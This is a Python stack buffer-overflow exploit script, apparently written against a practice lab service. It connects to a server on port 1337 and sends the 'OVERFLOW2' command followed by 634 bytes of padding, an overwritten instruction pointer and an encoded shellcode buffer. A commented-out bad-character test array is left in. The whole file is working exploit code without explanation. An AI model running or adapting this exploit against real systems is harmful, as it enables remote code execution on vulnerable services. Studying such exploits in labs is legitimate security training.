import socket, struct

s = socket.socket()
s.connect(("192.168.100.25", 1337))

buf =  b""
buf += b"\xfc\xbb\x10\xeb\x39\x1d\xeb\x0c\x5e\x56\x31\x1e\xad"
buf += b"\x01\xc3\x85\xc0\x75\xf7\xc3\xe8\xef\xff\xff\xff\xec"
buf += b"\x03\xb6\x1d\x0c\xd4\xa9\x94\xe9\xe5\xfb\xc3\x7a\x57"
buf += b"\xcc\x80\x2e\x54\xa7\xc5\xda\xef\xc5\xc1\xd3\x10\x26"
buf += b"\xa5\x59\xc9\x08\x09\xf1\x29\x0a\xf5\x0b\x7e\xec\xc4"
buf += b"\xc4\x73\xed\x01\x93\xfe\x02\xdf\xa8\x53\xcd\xb7\x25"
buf += b"\x11\xd1\x36\xe9\x1d\x69\x41\x8c\xe2\x1e\xfd\x8f\x32"
buf += b"\x55\xa5\xaf\xe2\xe1\x1e\xb7\x03\x25\x1b\x0e\x77\xf5"
buf += b"\x6d\xa1\x87\x8e\x5a\x4a\x76\x47\x93\x8c\xd5\xa6\x1b"
buf += b"\x01\x27\xee\x9c\xf9\x52\x04\xdf\x84\x64\xdf\x9d\x52"
buf += b"\xe0\xc0\x06\x11\x52\x25\xb6\xf6\x05\xae\xb4\xb3\x42"
buf += b"\xe8\xd8\x42\x86\x82\xe5\xcf\x29\x45\x6c\x8b\x0d\x41"
buf += b"\x34\x48\x2f\xd0\x90\x3f\x50\x02\x7c\xe0\xf4\x48\x6f"
buf += b"\xf7\x89\xb0\x6f\xf8\xd7\x26\xa3\x34\xe8\xb6\xab\x4f"
buf += b"\x9b\x84\x74\xfb\x33\xa5\xfd\x25\xc3\xbc\xea\xd6\x1b"
buf += b"\x06\x7a\x29\x9c\x77\x52\xed\xc8\x27\xcc\xc4\x70\xac"
buf += b"\x0c\xe9\xa4\x59\x07\x7d\x87\x36\x73\x63\x6f\x45\x7c"
buf += b"\x8a\x33\xc0\x9a\xfc\x9b\x82\x32\xbc\x4b\x63\xe3\x54"
buf += b"\x86\x6c\xdc\x44\xa9\xa6\x75\xee\x46\x1f\x2d\x86\xff"
buf += b"\x3a\xa5\x37\xff\x90\xc3\x77\x8b\x10\x33\x39\x7c\x50"
buf += b"\x27\x2d\x1b\x9a\xb7\xad\x8e\x9a\xdd\xa9\x18\xcc\x49"
buf += b"\xb3\x7d\x3a\xd6\x4c\xa8\x38\x11\xb2\x2d\x09\x69\x84"
buf += b"\xbb\x35\x05\xe8\x2b\xb6\xd5\xbe\x21\xb6\xbd\x66\x12"
buf += b"\xe5\xd8\x69\x8f\x99\x70\xff\x30\xc8\x25\xa8\x58\xf6"
buf += b"\x10\x9e\xc6\x09\x77\x9d\x01\xf5\x05\x89\xa9\x9e\xf5"
buf += b"\x89\x49\x5f\x9c\x09\x1a\x37\x6b\x26\x95\xf7\x94\xed"
buf += b"\xfe\x9f\x1f\x63\x4c\x01\x1f\xae\x10\x9f\x20\x5c\x89"
buf += b"\x10\x5a\x2c\x2e\xd1\x9b\x25\x4b\xd1\x9b\x4a\x6d\xed"
buf += b"\x4d\x72\x1b\x30\x4e\xc1\x14\x07\xf3\x63\xbf\x68\xa7"
buf += b"\x74\xea\x69\x47\x8a\x15\x6a\x47"

total_length = 2112
offset = 634
new_eip = struct.pack("<I",0x62501203)
#all_chars = b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"

payload = [
    b"OVERFLOW2 ",
    b"A" * offset,
    new_eip,
    #all_chars,
    buf
    #b"C" * (total_length - offset - len(new_eip))
]

payload = b"".join(payload)
s.send(payload)
s.close()